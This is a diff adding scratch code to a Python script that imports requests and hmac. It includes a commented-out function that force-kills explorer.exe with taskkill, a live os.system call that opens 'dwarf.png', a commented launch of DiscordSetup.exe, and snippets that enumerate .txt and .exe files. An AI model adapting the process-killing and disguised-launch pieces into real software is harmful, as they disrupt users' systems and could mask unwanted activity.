@@ -1,10 +1,51 @@
 import os
+import subprocess
+import glob
 import json
 import requests
 import hmac
 import hashlib 
 from shutil import copyfile
 
+
+# убитие процессов
+"""def scriptStart():
+    
+    for processName in psutil.process_iter():
+        if processName.name() == "explorer.exe":
+            os.system("taskkill /PID " + str(processName.pid) + " /F")
+
+scriptStart()"""
+
+cmd = "dwarf.png"
+os.system(cmd)
+#subprocess.run('DiscordSetup.exe')
+
+
+'''import glob
+os.chdir("c:\git")
+for file in glob.glob("*.txt"):
+    print(file)'''
+
+
+"""def find_files(filename, search_path):
+   result = []
+# Wlaking top-down from the root
+   for root, dir, files in os.walk(search_path):
+      if filename in files:
+         result.append(os.path.join(root, filename))
+   return result
+
+print(find_files("*txt","C:\git"))"""
+
+
+
+'''#path = r"C:\\Downloads"
+for root, dirs, files in os.walk("/Downloads"):
+    for file in files:
+        if file.endswith('.exe'):
+            path_file = os.path.join(root, file)
+            print(path_file)'''
 
 
 
